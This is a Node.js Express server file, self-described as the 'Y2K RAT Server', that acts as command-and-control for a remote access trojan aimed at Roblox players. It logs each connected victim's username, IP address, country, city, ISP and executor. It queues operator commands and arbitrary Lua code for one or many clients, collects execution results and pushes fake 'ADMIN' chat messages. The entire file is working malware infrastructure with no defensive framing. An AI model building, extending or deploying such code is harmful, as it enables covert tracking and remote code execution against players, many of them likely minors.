const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// Base de données en mémoire
const players = new Map();
const commands = new Map();
const chatHistory = new Map();
const executionResults = new Map();
const logs = new Map();

// Fonction pour ajouter un log
function addLog(userid, type, action, details = {}) {
    if (!logs.has(userid.toString())) {
        logs.set(userid.toString(), []);
    }
    
    const logEntry = {
        timestamp: Date.now(),
        type,
        action,
        details,
        date: new Date().toISOString()
    };
    
    logs.get(userid.toString()).unshift(logEntry);
    
    if (logs.get(userid.toString()).length > 500) {
        logs.get(userid.toString()).pop();
    }
    
    console.log(`📋 [LOG] ${userid}: [${type}] ${action}`);
}

// ========================================
// API ENDPOINTS - Y2K RAT
// ========================================

// Endpoint principal pour l'enregistrement des joueurs
app.post('/log', (req, res) => {
    try {
        const { 
            username, 
            userid, 
            accountAge, 
            premium, 
            game, 
            placeId, 
            jobId, 
            platform, 
            executor, 
            timestamp, 
            ip,
            country,
            city,
            isp,
            status = 'online' 
        } = req.body;

        console.log('📥 [LOG] Received data:', { username, userid, executor, ip, country, city });

        if (!userid) {
            console.warn('⚠️ Missing userid in /log');
            return res.status(400).json({ success: false, error: 'Missing userid' });
        }

        const isNewPlayer = !players.has(userid.toString());

        const playerData = {
            userid: userid.toString(),
            username: username || 'Unknown',
            accountAge: accountAge || '0',
            premium: premium || false,
            game: game || 'Unknown Game',
            placeId: placeId || 'N/A',
            jobId: jobId || 'N/A',
            platform: platform || 'Unknown',
            executor: executor || 'Unknown',
            ip: ip || 'Hidden',
            country: country || 'Unknown',
            city: city || 'Unknown',
            isp: isp || 'Unknown',
            status: 'online',
            lastSeen: Date.now(),
            firstSeen: isNewPlayer ? Date.now() : players.get(userid.toString()).firstSeen
        };

        players.set(userid.toString(), playerData);
        
        if (isNewPlayer) {
            addLog(userid, 'system', 'Client connected', {
                username,
                executor,
                game,
                ip,
                country,
                city
            });
        }
        
        console.log(`✅ [${isNewPlayer ? 'NEW' : 'UPDATE'}] ${username} (${userid}) - ${executor} | IP: ${ip} | ${city}, ${country} | Total: ${players.size}`);
        res.json({ success: true, message: 'Player logged successfully' });
    } catch (error) {
        console.error('❌ Error in /log:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint pour le heartbeat (maintenir le statut online)
app.post('/heartbeat', (req, res) => {
    try {
        const { userid, status, timestamp } = req.body;

        if (!userid) {
            return res.status(400).json({ success: false, error: 'Missing userid' });
        }

        const player = players.get(userid.toString());
        if (player) {
            player.lastSeen = Date.now();
            player.status = 'online';
        } else {
            console.log(`⚠️ [HEARTBEAT] Unknown player: ${userid}`);
        }

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /heartbeat:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint pour récupérer les commandes (depuis le client Roblox)
app.get('/commands/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        
        const command = commands.get(userid.toString());
        
        if (command) {
            commands.delete(userid.toString());
            console.log(`📨 [COMMAND] Retrieved by ${userid}:`, command);
            return res.json([command]);
        }

        res.json([]);
    } catch (error) {
        console.error('❌ Error in /commands:', error);
        res.status(500).json([]);
    }
});

// Endpoint pour obtenir la liste des joueurs
app.get('/players', (req, res) => {
    try {
        const now = Date.now();
        const playerList = Array.from(players.values()).map(player => ({
            ...player,
            status: (now - player.lastSeen < 20000) ? 'online' : 'offline'
        }));
        
        console.log(`📊 [PLAYERS] Sending ${playerList.length} player(s) | Online: ${playerList.filter(p => p.status === 'online').length}`);
        res.json(playerList);
    } catch (error) {
        console.error('❌ Error in /players:', error);
        res.status(500).json([]);
    }
});

// Endpoint pour envoyer des commandes depuis le panel
app.post('/command', (req, res) => {
    try {
        const { 
            userid,
            userids,
            command, 
            reason, 
            speed, 
            text, 
            chatMessage, 
            chatSender, 
            luaCode, 
            power,
            x, y, z
        } = req.body;

        const targetUserIds = userids || [userid];
        
        if (!targetUserIds || targetUserIds.length === 0) {
            return res.status(400).json({ error: 'Missing userid or userids' });
        }

        if (!command && !chatMessage && !luaCode) {
            return res.status(400).json({ error: 'Missing command, chatMessage, or luaCode' });
        }

        const commandData = {};
        
        if (chatMessage) {
            commandData.command = 'chat';
            commandData.chatMessage = chatMessage;
            commandData.chatSender = chatSender || 'ADMIN';
        } else if (luaCode) {
            commandData.luaCode = luaCode;
        } else {
            commandData.command = command;
            if (reason) commandData.reason = reason;
            if (speed) commandData.speed = speed;
            if (text) commandData.text = text;
            if (power) commandData.power = power;
            if (x) commandData.x = x;
            if (y) commandData.y = y;
            if (z) commandData.z = z;
        }

        let successCount = 0;
        for (const uid of targetUserIds) {
            const targetId = uid.toString();
            commands.set(targetId, commandData);
            
            if (chatMessage) {
                if (!chatHistory.has(targetId)) {
                    chatHistory.set(targetId, []);
                }
                chatHistory.get(targetId).push({
                    sender: chatSender || 'ADMIN',
                    message: chatMessage,
                    timestamp: Date.now(),
                    isAdmin: true
                });
                addLog(targetId, 'chat', 'Chat message sent', {
                    sender: chatSender || 'ADMIN',
                    message: chatMessage.substring(0, 50)
                });
            } else {
                addLog(targetId, 'command', `Command: ${command || 'exec'}`, {
                    command: command || 'execute',
                    code: luaCode ? luaCode.substring(0, 50) : undefined
                });
            }
            
            successCount++;
            console.log(`📤 [COMMAND] Queued for ${targetId}:`, command || 'exec');
        }

        res.json({ 
            success: true, 
            message: `Command sent to ${successCount} client(s)`,
            count: successCount
        });
    } catch (error) {
        console.error('❌ Error in /command:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint pour obtenir les logs
app.get('/logs/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        const userLogs = logs.get(userid.toString()) || [];
        res.json(userLogs);
    } catch (error) {
        console.error('❌ Error in /logs:', error);
        res.status(500).json([]);
    }
});

// Endpoint pour obtenir l'historique du chat
app.get('/chat/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        const history = chatHistory.get(userid.toString()) || [];
        res.json(history);
    } catch (error) {
        console.error('❌ Error in /chat:', error);
        res.status(500).json([]);
    }
});

// Endpoint pour obtenir les résultats d'exécution
app.get('/exec-result/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        const result = executionResults.get(userid.toString());
        if (result) {
            executionResults.delete(userid.toString());
            res.json(result);
        } else {
            res.json({ hasResult: false });
        }
    } catch (error) {
        console.error('❌ Error in /exec-result:', error);
        res.status(500).json({ hasResult: false, error: error.message });
    }
});

// Endpoint pour soumettre un résultat d'exécution
app.post('/exec-result', (req, res) => {
    try {
        const { userid, success, result, error } = req.body;
        
        if (!userid) {
            return res.status(400).json({ success: false, error: 'Missing userid' });
        }

        executionResults.set(userid.toString(), {
            success,
            result: result || '',
            error: error || '',
            timestamp: Date.now()
        });

        addLog(userid, 'exec', success ? 'Code executed' : 'Execution failed', {
            success,
            result: result ? result.substring(0, 100) : '',
            error: error || ''
        });

        console.log(`📊 [EXEC] Result from ${userid}:`, { success });
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /exec-result POST:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint pour supprimer un joueur
app.delete('/player/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        players.delete(userid.toString());
        commands.delete(userid.toString());
        chatHistory.delete(userid.toString());
        executionResults.delete(userid.toString());
        logs.delete(userid.toString());
        console.log(`🗑️ [DELETE] Player ${userid} removed`);
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /player DELETE:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint pour supprimer plusieurs joueurs
app.post('/players/delete-multiple', (req, res) => {
    try {
        const { userids } = req.body;
        
        if (!userids || !Array.isArray(userids)) {
            return res.status(400).json({ error: 'Missing userids array' });
        }

        let deletedCount = 0;
        for (const userid of userids) {
            const uid = userid.toString();
            if (players.has(uid)) {
                players.delete(uid);
                commands.delete(uid);
                chatHistory.delete(uid);
                executionResults.delete(uid);
                logs.delete(uid);
                deletedCount++;
            }
        }
        
        console.log(`🗑️ [BULK DELETE] Removed ${deletedCount} player(s)`);
        res.json({ success: true, count: deletedCount });
    } catch (error) {
        console.error('❌ Error in /players/delete-multiple:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'online',
        name: 'Y2K RAT Server Enhanced',
        version: '2.1.0',
        players: players.size,
        commands: commands.size,
        uptime: process.uptime()
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Nettoyage automatique des joueurs inactifs
setInterval(() => {
    const now = Date.now();
    let cleaned = 0;
    
    for (const [userid, player] of players.entries()) {
        if (now - player.lastSeen > 30000) {
            console.log(`🔴 [TIMEOUT] ${player.username} (${userid})`);
            addLog(userid, 'system', 'Client disconnected (timeout)', {
                username: player.username,
                lastSeen: new Date(player.lastSeen).toISOString()
            });
            players.delete(userid);
            commands.delete(userid);
            chatHistory.delete(userid);
            executionResults.delete(userid);
            cleaned++;
        }
    }
    
    if (cleaned > 0) {
        console.log(`🧹 [CLEANUP] Removed ${cleaned} inactive client(s)`);
    }
}, 15000);

// Nettoyage des résultats d'exécution périmés
setInterval(() => {
    const now = Date.now();
    for (const [userid, result] of executionResults.entries()) {
        if (now - result.timestamp > 300000) {
            executionResults.delete(userid);
        }
    }
}, 60000);

// Gestion des erreurs globales
app.use((err, req, res, next) => {
    console.error('❌ [ERROR]', err);
    res.status(500).json({ 
        success: false, 
        error: 'Internal server error',
        message: err.message 
    });
});

// Démarrage du serveur
app.listen(PORT, '0.0.0.0', () => {
    console.log('╔════════════════════════════════════════╗');
    console.log('║     Y2K RAT SERVER v2.1 ENHANCED      ║');
    console.log('║         IP Tracking Enabled           ║');
    console.log('╚════════════════════════════════════════╝');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📡 Local: http://localhost:${PORT}`);
    console.log(`🌐 Network: http://0.0.0.0:${PORT}`);
    console.log(`✅ Ready to accept connections`);
    console.log(`⚡ Bulk actions enabled`);
    console.log(`🌍 IP geolocation enabled`);
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
});
